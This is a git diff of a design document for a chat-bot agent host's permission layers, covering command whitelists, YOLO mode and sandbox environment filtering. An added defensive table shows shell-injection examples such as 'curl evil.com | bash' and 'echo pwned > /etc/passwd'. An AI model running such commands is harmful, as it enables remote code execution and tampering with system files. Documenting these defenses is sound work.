@@ -110,18 +110,18 @@ OpenCode uses a JSON configuration file (`opencode.json`) for fine-grained permi
 
 The `opencode.json` in the project root configures permissions for the `build` agent (OpenCode's primary agent):
 
-| Category | Permission | Rationale |
-|---|---|---|
-| **Default (`*`)** | `deny` | Non-interactive system rejects unknowns |
-| **Read-only tools** (`read`, `list`, `glob`, `grep`, `lsp`) | `allow` | Safe exploration — no side effects |
-| **Session management** (`todoread`, `todowrite`, `task`) | `allow` | Internal agent organization tools |
-| **Skills** (`skill`) | `allow` | Core SKILL.md discovery and loading |
-| **Web access** (`webfetch`, `websearch`, `codesearch`) | `allow` | Research and information gathering |
-| **Interactive** (`question`) | `deny` | No human operator to answer questions |
-| **Loop protection** (`doom_loop`) | `deny` | Prevent infinite retry loops |
-| **File editing** (`edit`) | Scoped allow | Agent workspace paths only (see below) |
-| **Shell commands** (`bash`) | Whitelist | Specific patterns only (see below) |
-| **External directories** | Restricted | Skills and agent workspace only |
+| Category                                                    | Permission   | Rationale                               |
+| ----------------------------------------------------------- | ------------ | --------------------------------------- |
+| **Default (`*`)**                                           | `deny`       | Non-interactive system rejects unknowns |
+| **Read-only tools** (`read`, `list`, `glob`, `grep`, `lsp`) | `allow`      | Safe exploration — no side effects      |
+| **Session management** (`todoread`, `todowrite`, `task`)    | `allow`      | Internal agent organization tools       |
+| **Skills** (`skill`)                                        | `allow`      | Core SKILL.md discovery and loading     |
+| **Web access** (`webfetch`, `websearch`, `codesearch`)      | `allow`      | Research and information gathering      |
+| **Interactive** (`question`)                                | `deny`       | No human operator to answer questions   |
+| **Loop protection** (`doom_loop`)                           | `deny`       | Prevent infinite retry loops            |
+| **File editing** (`edit`)                                   | Scoped allow | Agent workspace paths only (see below)  |
+| **Shell commands** (`bash`)                                 | Whitelist    | Specific patterns only (see below)      |
+| **External directories**                                    | Restricted   | Skills and agent workspace only         |
 
 ### Edit Permission (Scoped)
 
@@ -143,19 +143,19 @@ This allows the self-research feature to write study notes to the agent workspac
 
 Shell commands use default-deny with specific allowed patterns:
 
-| Pattern | Purpose |
-|---|---|
-| `deno run *skills/*/scripts/*.ts*` | Execute skill scripts (memory-save, send-reply, etc.) |
-| `agent-browser *` | Browser automation skill (command-based) |
-| `rg *` | ripgrep for memory search |
-| `curl *` | HTTP requests for web research |
-| `cat *` | Read file contents |
-| `head *`, `tail *` | Read partial file contents |
-| `ls *`, `find *` | List and find files |
-| `wc *` | Word/line counting |
-| `git *` | Denied — prevents repo state mutation |
-| `echo *` | Denied — prevents arbitrary file writes via redirection |
-| `mkdir *` | Denied — prevents arbitrary directory creation |
+| Pattern                            | Purpose                                                 |
+| ---------------------------------- | ------------------------------------------------------- |
+| `deno run *skills/*/scripts/*.ts*` | Execute skill scripts (memory-save, send-reply, etc.)   |
+| `agent-browser *`                  | Browser automation skill (command-based)                |
+| `rg *`                             | ripgrep for memory search                               |
+| `curl *`                           | HTTP requests for web research                          |
+| `cat *`                            | Read file contents                                      |
+| `head *`, `tail *`                 | Read partial file contents                              |
+| `ls *`, `find *`                   | List and find files                                     |
+| `wc *`                             | Word/line counting                                      |
+| `git *`                            | Denied — prevents repo state mutation                   |
+| `echo *`                           | Denied — prevents arbitrary file writes via redirection |
+| `mkdir *`                          | Denied — prevents arbitrary directory creation          |
 
 ### External Directory Permission
 
@@ -190,7 +190,7 @@ The method evaluates permission requests in this order:
 
 2. **Skills directory read** — Auto-approve `read` requests where paths start with `/home/deno/.copilot/skills`. This allows agents to discover SKILL.md files.
 
-3. **Skill command execution** — For `execute` kind requests, check if **all** commands match the skill auto-approve list (see [Skill Auto-Approve List](#skill-auto-approve-list)).
+3. **Skill command execution** — For `execute` kind requests, first reject commands containing shell injection characters (`;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, `#`, newlines), then check if **all** commands match the skill auto-approve list using safe token matching (see [Skill Auto-Approve List](#skill-auto-approve-list)).
 
 4. **Registered skill check** — Extract skill name from `rawInput.skill` or `toolCall.title` and check against the `SkillRegistry`.
 
@@ -235,21 +235,21 @@ When `sandbox.filterEnv` is `true` (default), the agent subprocess only receives
 
 **Base allowed (all agent types):**
 
-| Variable | Purpose |
-|---|---|
-| `PATH`, `HOME`, `USER`, `SHELL`, `TERM` | System essentials |
-| `LANG`, `LC_ALL` | Locale |
-| `DENO_DIR`, `DENO_NO_UPDATE_CHECK` | Deno runtime |
-| `SKILL_API_PORT`, `SESSION_ID` | Skill API communication |
-| `AGENT_WORKSPACE` | Agent workspace path |
-| `TMPDIR` | Workspace-scoped temp directory |
+| Variable                                | Purpose                         |
+| --------------------------------------- | ------------------------------- |
+| `PATH`, `HOME`, `USER`, `SHELL`, `TERM` | System essentials               |
+| `LANG`, `LC_ALL`                        | Locale                          |
+| `DENO_DIR`, `DENO_NO_UPDATE_CHECK`      | Deno runtime                    |
+| `SKILL_API_PORT`, `SESSION_ID`          | Skill API communication         |
+| `AGENT_WORKSPACE`                       | Agent workspace path            |
+| `TMPDIR`                                | Workspace-scoped temp directory |
 
 **Agent-type-specific:**
 
-| Agent | Additional variables |
-|---|---|
-| Copilot | `GITHUB_TOKEN`, `COPILOT_GITHUB_TOKEN` |
-| Gemini | `GEMINI_API_KEY`, `GEMINI_SYSTEM_MD` |
+| Agent    | Additional variables                                                                                        |
+| -------- | ----------------------------------------------------------------------------------------------------------- |
+| Copilot  | `GITHUB_TOKEN`, `COPILOT_GITHUB_TOKEN`                                                                      |
+| Gemini   | `GEMINI_API_KEY`, `GEMINI_SYSTEM_MD`                                                                        |
 | OpenCode | `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, `OPENCODE_API_KEY`, `GOOGLE_GENERATIVE_AI_API_KEY`, `OPENCODE_YOLO` |
 
 Additional env vars can be added via `sandbox.allowedEnvVars` config array.
@@ -269,13 +269,13 @@ When `sandbox.networkIsolation` is `true` (default: `false`), the agent command 
 
 YOLO mode bypasses permission restrictions at multiple layers simultaneously:
 
-| Layer | YOLO Behavior |
-|---|---|
-| Layer 1 (Agent CLI) | Copilot: `--yolo` flag, no `--available-tools` restrictions. Gemini: `--yolo` flag. OpenCode: `OPENCODE_YOLO=true` env var. |
-| Layer 2 (opencode.json) | Overridden by `OPENCODE_YOLO=true` — all permissions become `allow`. |
-| Layer 3 (ACP Client) | `requestPermission()` auto-approves every request. |
-| Layer 4 (File Boundary) | Unchanged — path boundaries still enforced. |
-| Layer 5 (Sandbox) | Unchanged — env filtering and network isolation still apply. |
+| Layer                   | YOLO Behavior                                                                                                               |
+| ----------------------- | --------------------------------------------------------------------------------------------------------------------------- |
+| Layer 1 (Agent CLI)     | Copilot: `--yolo` flag, no `--available-tools` restrictions. Gemini: `--yolo` flag. OpenCode: `OPENCODE_YOLO=true` env var. |
+| Layer 2 (opencode.json) | Overridden by `OPENCODE_YOLO=true` — all permissions become `allow`.                                                        |
+| Layer 3 (ACP Client)    | `requestPermission()` auto-approves every request.                                                                          |
+| Layer 4 (File Boundary) | Unchanged — path boundaries still enforced.                                                                                 |
+| Layer 5 (Sandbox)       | Unchanged — env filtering and network isolation still apply.                                                                |
 
 ### YOLO Resolution
 
@@ -288,10 +288,11 @@ YOLO can be enabled in two ways:
 channels:
   - id: "discord/account/123456789012345678"
     enabled: true
-    yolo: true  # YOLO for this account
+    yolo: true # YOLO for this account
 ```
 
 The `getEffectiveYolo()` method resolves YOLO with priority:
+
 1. Global `--yolo` flag → always wins
 2. Per-channel `yolo: true` → checked via `ReplyPolicyEvaluator.resolveYoloDecision()`
 3. Default → disabled
@@ -306,14 +307,14 @@ The `getEffectiveYolo()` method resolves YOLO with priority:
 
 Different session types resolve YOLO differently based on whether they have a real platform/user/channel context:
 
-| Session Type | YOLO Resolution | Reason |
-|---|---|---|
-| **message** | `getEffectiveYolo(platform, userId, channelId)` | Real user/channel context → per-channel config applies |
-| **channelLurk** | `getEffectiveYolo(platform, userId, channelId)` | Real channel context → per-channel config applies |
-| **spontaneous** | `getEffectiveYolo(platform, botId, channelId)` | Posts to real channels → per-channel config applies |
-| **reminder** | `getEffectiveYolo(platform, userId, dmChannelId)` | Real user DM context → per-channel config applies |
-| **selfResearch** | `this.yolo` (global flag only) | Internal session with synthetic identifiers — per-channel config is meaningless |
-| **memoryMaintenance** | `this.yolo` (global flag only) | Internal session — same reasoning as selfResearch |
+| Session Type          | YOLO Resolution                                   | Reason                                                                          |
+| --------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------- |
+| **message**           | `getEffectiveYolo(platform, userId, channelId)`   | Real user/channel context → per-channel config applies                          |
+| **channelLurk**       | `getEffectiveYolo(platform, userId, channelId)`   | Real channel context → per-channel config applies                               |
+| **spontaneous**       | `getEffectiveYolo(platform, botId, channelId)`    | Posts to real channels → per-channel config applies                             |
+| **reminder**          | `getEffectiveYolo(platform, userId, dmChannelId)` | Real user DM context → per-channel config applies                               |
+| **selfResearch**      | `this.yolo` (global flag only)                    | Internal session with synthetic identifiers — per-channel config is meaningless |
+| **memoryMaintenance** | `this.yolo` (global flag only)                    | Internal session — same reasoning as selfResearch                               |
 
 ### Internal Sessions (selfResearch, memoryMaintenance)
 
@@ -329,14 +330,14 @@ These sessions use synthetic identifiers (e.g., platform=`"discord"`, userId=`"s
 
 ### Comparison Table
 
-| Aspect | Copilot | Gemini | OpenCode |
-|---|---|---|---|
-| **Binary** | `copilot` | `gemini` | `opencode` |
-| **ACP flag** | `--acp` | `--experimental-acp` | `acp` (subcommand) |
-| **YOLO flag** | `--yolo` | `--yolo` | `OPENCODE_YOLO=true` env var |
-| **Tool restriction** (non-YOLO) | `--available-tools bash,read_bash,write_bash,stop_bash` | None (no CLI support) | `opencode.json` (Layer 2) |
-| **Config-based permissions** | Not supported | Not supported | ✅ `opencode.json` |
-| **Extra CLI flags** | `--disable-builtin-mcps`, `--no-ask-user`, `--no-color`, `--no-auto-update`, `--experimental` | — | — |
+| Aspect                          | Copilot                                                                                       | Gemini                | OpenCode                     |
+| ------------------------------- | --------------------------------------------------------------------------------------------- | --------------------- | ---------------------------- |
+| **Binary**                      | `copilot`                                                                                     | `gemini`              | `opencode`                   |
+| **ACP flag**                    | `--acp`                                                                                       | `--experimental-acp`  | `acp` (subcommand)           |
+| **YOLO flag**                   | `--yolo`                                                                                      | `--yolo`              | `OPENCODE_YOLO=true` env var |
+| **Tool restriction** (non-YOLO) | `--available-tools bash,read_bash,write_bash,stop_bash`                                       | None (no CLI support) | `opencode.json` (Layer 2)    |
+| **Config-based permissions**    | Not supported                                                                                 | Not supported         | ✅ `opencode.json`           |
+| **Extra CLI flags**             | `--disable-builtin-mcps`, `--no-ask-user`, `--no-color`, `--no-auto-update`, `--experimental` | —                     | —                            |
 
 ### How Each Agent's Permissions Interact with Layers
 
@@ -356,20 +357,21 @@ The skill auto-approve list determines which bash commands are automatically app
 
 ### Script-Based Skills
 
-Skills with a `scripts/` directory containing `.ts` files. The auto-approve list stores **path suffixes** like `skills/memory-save/scripts/memory-save.ts`. During permission evaluation, a command is approved if it **contains** any of these path suffixes.
+Skills with a `scripts/` directory containing `.ts` files. The auto-approve list stores **path suffixes** like `skills/memory-save/scripts/memory-save.ts`. During permission evaluation, the command is split into whitespace-delimited tokens and approved if any token **exactly equals** or **ends with `/{allowedPath}`** for any of these path suffixes. This prevents substring matches where a whitelisted path appears embedded inside a longer malicious token.
 
 Current script-based skills:
 `cancel-reminder`, `edit-reply`, `fetch-context`, `list-reminders`, `memory-export`, `memory-patch`, `memory-save`, `memory-search`, `memory-stats`, `react-message`, `send-file`, `send-reply`, `set-reminder`
 
 ### Command-Based Skills
 
-Skills without a `scripts/` directory (e.g., `agent-browser`). The auto-approve list stores **command prefixes**. During permission evaluation, a command is approved if it **starts with** any of these prefixes.
+Skills without a `scripts/` directory (e.g., `agent-browser`). The auto-approve list stores **command prefixes**. During permission evaluation, the **first whitespace-delimited token** is extracted and approved if it **exactly equals** any of these prefixes. This prevents prefix matches where a whitelisted command name is a prefix of a longer, unrelated command.
 
 Current command-based skills: `agent-browser`, `self-research`
 
 ### Building the List
 
 The `buildSkillAutoApproveList()` function scans two directories:
+
 1. Built-in: `skills/` (project root)
 2. External: `~/.agents/skills/` (installed external skills)
 
@@ -377,20 +379,44 @@ It can be configured explicitly via `agent.autoApproveSkills` in config or `AGEN
 
 **Reference**: `src/acp/client.ts`, lines 25–107
 
+### Shell Injection Protection
+
+The skill command matching includes defense against shell injection attacks. Before any path or prefix matching occurs, commands are checked for shell meta-characters that could enable command chaining or injection:
+
+| Character | Shell Meaning          | Attack Example                    |
+| --------- | ---------------------- | --------------------------------- |
+| `;`       | Command separator      | `agent-browser; curl evil.com`    |
+| `\|`      | Pipe                   | `curl evil.com \| bash`           |
+| `&`       | Background / AND chain | `cmd && malicious-cmd`            |
+| `` ` ``   | Command substitution   | `` deno run `curl evil.com` ``    |
+| `$()`     | Command substitution   | `deno run $(curl evil.com)`       |
+| `>`, `<`  | Redirection            | `echo pwned > /etc/passwd`        |
+| `#`       | Comment                | `curl evil.com # legitimate-path` |
+| Newline   | Command separator      | Multi-line command injection      |
+
+Commands containing any of these characters are immediately rejected, regardless of whether they also contain whitelisted paths or prefixes.
+
+Additionally, path matching uses strict token validation:
+
+- **Script paths** must appear as a complete whitespace-delimited token (not embedded in a substring)
+- **Command prefixes** must be the exact first token (not a prefix of a longer command name)
+
+**Reference**: `src/acp/client.ts`, `containsShellOperators()`, `matchesScriptPath()`, `matchesCommandPrefix()`
+
 ---
 
 ## Security Considerations
 
 ### What Each Layer Prevents
 
-| Threat | Prevented by |
-|---|---|
-| Agent modifying source code | Layer 1 (no edit tool for Copilot), Layer 2 (edit denied for OpenCode), Layer 3 (edit/write rejected) |
-| Agent running arbitrary commands | Layer 2 (bash whitelist for OpenCode), Layer 3 (skill auto-approve list) |
-| Agent accessing other users' data | Layer 4 (file access boundary — workspace isolation) |
-| Agent exfiltrating secrets via env vars | Layer 5 (env var filtering) |
-| Agent making unauthorized network calls | Layer 5 (optional network isolation) |
-| Agent committing/pushing to git | Layer 2 (git denied for OpenCode), Layer 3 (not in skill list) |
+| Threat                                  | Prevented by                                                                                          |
+| --------------------------------------- | ----------------------------------------------------------------------------------------------------- |
+| Agent modifying source code             | Layer 1 (no edit tool for Copilot), Layer 2 (edit denied for OpenCode), Layer 3 (edit/write rejected) |
+| Agent running arbitrary commands        | Layer 2 (bash whitelist for OpenCode), Layer 3 (skill auto-approve list)                              |
+| Agent accessing other users' data       | Layer 4 (file access boundary — workspace isolation)                                                  |
+| Agent exfiltrating secrets via env vars | Layer 5 (env var filtering)                                                                           |
+| Agent making unauthorized network calls | Layer 5 (optional network isolation)                                                                  |
+| Agent committing/pushing to git         | Layer 2 (git denied for OpenCode), Layer 3 (not in skill list)                                        |
 
 ### Known Limitations
 
@@ -398,7 +424,7 @@ It can be configured explicitly via `agent.autoApproveSkills` in config or `AGEN
 
 2. **OpenCode's Layer 2 is only as strong as opencode.json**: If the configuration file is modified or the `OPENCODE_YOLO=true` env var leaks through, all Layer 2 protections are bypassed.
 
-3. **Layer 3 pattern matching is substring/prefix-based**: A carefully crafted command could potentially match a whitelisted prefix while performing unintended actions (e.g., a command containing a whitelisted path suffix as part of a longer malicious command).
+3. **Layer 3 relies on shell operator detection**: Layer 3 rejects commands containing shell meta-characters (`;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, `#`, newlines) and validates script paths as complete whitespace-delimited tokens and command prefixes as exact first-token matches. While this prevents known injection patterns (command chaining, piping, comment hiding), novel shell features or encoding tricks not covered by the character set could theoretically bypass the check.
 
 4. **Self-research and memory maintenance always run in restricted mode**: There is no way to enable per-channel YOLO for these internal sessions — only the global `--yolo` flag works. This is by design (synthetic identifiers), but means trusted-channel YOLO configs don't apply to background tasks.
 
@@ -412,9 +438,9 @@ It can be configured explicitly via `agent.autoApproveSkills` in config or `AGEN
 agent:
   # Sandbox isolation for agent subprocess
   sandbox:
-    filterEnv: true           # Filter env vars to allowed list (default: true)
-    networkIsolation: false   # Linux network namespace isolation (default: false)
-    allowedEnvVars: []        # Additional env var names to allow through
+    filterEnv: true # Filter env vars to allowed list (default: true)
+    networkIsolation: false # Linux network namespace isolation (default: false)
+    allowedEnvVars: [] # Additional env var names to allow through
 
   # Skill auto-approve list (optional — falls back to scanning skills/ dir)
   autoApproveSkills:
@@ -431,12 +457,12 @@ channels:
 
 ### Environment Variables
 
-| Variable | Config Path | Description |
-|---|---|---|
-| `AGENT_SANDBOX_FILTER_ENV` | `agent.sandbox.filterEnv` | `"true"` / `"false"` |
+| Variable                          | Config Path                      | Description          |
+| --------------------------------- | -------------------------------- | -------------------- |
+| `AGENT_SANDBOX_FILTER_ENV`        | `agent.sandbox.filterEnv`        | `"true"` / `"false"` |
 | `AGENT_SANDBOX_NETWORK_ISOLATION` | `agent.sandbox.networkIsolation` | `"true"` / `"false"` |
-| `AGENT_SANDBOX_ALLOWED_ENV_VARS` | `agent.sandbox.allowedEnvVars` | Comma-separated list |
-| `AGENT_AUTO_APPROVE_SKILLS` | `agent.autoApproveSkills` | Comma-separated list |
+| `AGENT_SANDBOX_ALLOWED_ENV_VARS`  | `agent.sandbox.allowedEnvVars`   | Comma-separated list |
+| `AGENT_AUTO_APPROVE_SKILLS`       | `agent.autoApproveSkills`        | Comma-separated list |
 
 ### OpenCode-Specific
 
